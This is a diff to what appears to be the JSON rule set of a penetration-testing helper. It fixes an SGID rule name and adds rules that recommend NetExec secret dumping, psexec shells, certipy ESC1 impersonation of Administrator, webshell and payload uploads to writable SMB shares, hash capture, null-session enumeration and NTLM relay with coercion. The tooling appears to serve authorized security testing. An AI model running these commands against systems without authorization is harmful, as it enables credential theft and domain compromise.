@@ -467,19 +467,19 @@
         }
     },
     {
-        "name": "GUID Binary Found",
+        "name": "SGID Binary Found",
         "priority": 78,
         "host_scope": "same_host",
         "triggers": [
-            { "id": 1, "entity_type": "privilege_escalation", "name_match": { "type": "exact", "value": "guid_binary_found" } }
+            { "id": 1, "entity_type": "privilege_escalation", "name_match": { "type": "exact", "value": "sgid_binary_found" } }
         ],
         "suggestion": {
-            "description": "GUID binary found on {trigger.1.host}: {trigger.1.attributes.description}",
-            "rationale": "GUID binaries run with group privileges. Less common than SUID but can still provide escalation to privileged groups.",
+            "description": "SGID binary found on {trigger.1.host}: {trigger.1.attributes.description}",
+            "rationale": "SGID binaries run with group privileges. Less common than SUID but can still provide escalation to privileged groups.",
             "commands": [
                 "find / -perm -2000 -type f 2>/dev/null",
                 "Check https://gtfobins.github.io/ for abuse methods",
-                "id (check which group the GUID binary runs as)"
+                "id (check which group the SGID binary runs as)"
             ]
         }
     },
@@ -963,6 +963,116 @@
                 "crackmapexec smb {trigger.1.host} -u users.txt -p 'Welcome1' --continue-on-success",
                 "Spray one password at a time, wait for lockout window between attempts"
             ]
+        }
+    },
+    {
+        "_comment": "=== NetExec / SMB / ADCS / nuclei (Phase 3-4 parsers) ===",
+        "name": "Validated Admin Access (Pwn3d!) - Dump Secrets",
+        "priority": 96,
+        "host_scope": "same_host",
+        "triggers": [
+            { "id": 1, "entity_type": "privilege_escalation", "name_match": { "type": "exact", "value": "admin_access_validated" } }
+        ],
+        "suggestion": {
+            "description": "Administrative access confirmed on {trigger.1.host}: {trigger.1.attributes.description}",
+            "rationale": "NetExec reported Pwn3d! - you already have admin on this host. Dump secrets for credential reuse and lateral movement across the domain.",
+            "commands": [
+                "Dump SAM: nxc smb {trigger.1.host} -u '<user>' -p '<pass>' --sam",
+                "Dump LSA: nxc smb {trigger.1.host} -u '<user>' -p '<pass>' --lsa",
+                "Dump NTDS (if DC): nxc smb {trigger.1.host} -u '<user>' -p '<pass>' --ntds",
+                "Shell: impacket-psexec '<user>:<pass>@{trigger.1.host}' (or -hashes for PtH)"
+            ],
+            "references": ["https://www.netexec.wiki/smb-protocol/dumping-credentials"]
+        }
+    },
+    {
+        "name": "AD CS Vulnerable Certificate Template (ESC)",
+        "priority": 93,
+        "host_scope": "same_host",
+        "triggers": [
+            { "id": 1, "entity_type": "privilege_escalation", "name_match": { "type": "regex", "value": "^adcs_esc" } }
+        ],
+        "suggestion": {
+            "description": "AD CS misconfiguration {trigger.1.attributes.esc} on template '{trigger.1.attributes.template}' ({trigger.1.host}).",
+            "rationale": "Vulnerable certificate templates allow privilege escalation to Domain Admin by requesting a certificate as a privileged user. ESC1/ESC4 are the most common and reliable.",
+            "commands": [
+                "Review: {trigger.1.attributes.description}",
+                "Request as admin (ESC1): certipy req -u '<user>@{trigger.1.host}' -p '<pass>' -ca <CA> -template '{trigger.1.attributes.template}' -upn Administrator@{trigger.1.host}",
+                "Authenticate: certipy auth -pfx administrator.pfx -dc-ip <DC_IP>",
+                "Pass-the-Hash / -ticket with the recovered NT hash or TGT"
+            ],
+            "references": ["https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.html"]
+        }
+    },
+    {
+        "name": "CVE Detected - Find Public Exploit",
+        "priority": 84,
+        "host_scope": "same_host",
+        "triggers": [
+            { "id": 1, "entity_type": "vulnerability", "name_match": { "type": "regex", "value": "^CVE-\\d{4}-\\d+" } }
+        ],
+        "suggestion": {
+            "description": "Vulnerability {trigger.1.name} reported on {trigger.1.host}:{trigger.1.port}.",
+            "rationale": "A scanner (nuclei/nmap NSE) flagged a specific CVE. Confirm it applies and locate a public exploit before relying on it.",
+            "commands": [
+                "searchsploit {trigger.1.name}",
+                "Search GitHub for '{trigger.1.name} PoC' / exploit code",
+                "Verify the service version actually matches the CVE before exploiting"
+            ]
+        }
+    },
+    {
+        "name": "Writable SMB Share - Upload / Lateral Movement",
+        "priority": 80,
+        "host_scope": "same_host",
+        "triggers": [
+            { "id": 1, "entity_type": "misconfiguration", "name_match": { "type": "exact", "value": "writable_smb_share" } }
+        ],
+        "suggestion": {
+            "description": "Writable SMB share '{trigger.1.attributes.share}' on {trigger.1.host}.",
+            "rationale": "Writable shares enable payload delivery, config tampering, and lateral movement (e.g. dropping a malicious scheduled-task XML, SCF/LNK capture files, or a webshell into a served directory).",
+            "commands": [
+                "smbclient //{trigger.1.host}/{trigger.1.attributes.share} -U '<user>%<pass>'",
+                "Drop an SCF/URL file to capture NetNTLM hashes (then crack/relay)",
+                "If the share maps to a web root, upload a webshell",
+                "nxc smb {trigger.1.host} -u '<user>' -p '<pass>' --put-file ./payload \\\\{trigger.1.attributes.share}\\\\payload"
+            ]
+        }
+    },
+    {
+        "name": "Null/Guest SMB Session - Enumerate Without Creds",
+        "priority": 72,
+        "host_scope": "same_host",
+        "triggers": [
+            { "id": 1, "entity_type": "misconfiguration", "name_match": { "type": "exact", "value": "null_session_allowed" } }
+        ],
+        "suggestion": {
+            "description": "Anonymous/guest SMB session allowed on {trigger.1.host}.",
+            "rationale": "Null/guest sessions let you enumerate users, shares, and the password policy with no credentials - the starting point for spraying and RID cycling.",
+            "commands": [
+                "enum4linux-ng -A {trigger.1.host}",
+                "nxc smb {trigger.1.host} -u '' -p '' --shares --users --rid-brute",
+                "smbmap -H {trigger.1.host} -u guest -p ''"
+            ]
+        }
+    },
+    {
+        "name": "SMB Signing Disabled - NTLM Relay",
+        "priority": 70,
+        "host_scope": "same_host",
+        "triggers": [
+            { "id": 1, "entity_type": "misconfiguration", "name_match": { "type": "exact", "value": "smb_signing_disabled" } }
+        ],
+        "suggestion": {
+            "description": "SMB signing disabled on {trigger.1.host} - viable NTLM relay target.",
+            "rationale": "Hosts without SMB signing can be relayed to: capture/coerce authentication elsewhere and relay it here for code execution or hash dumping.",
+            "commands": [
+                "Add {trigger.1.host} to targets.txt",
+                "impacket-ntlmrelayx -tf targets.txt -smb2support",
+                "Coerce auth (PetitPotam/printerbug/mitm6) toward your relay listener",
+                "On relay success: -c '<command>' or --dump-sam"
+            ],
+            "references": ["https://www.thehacker.recipes/a-d/movement/ntlm/relay"]
         }
     }
 ]
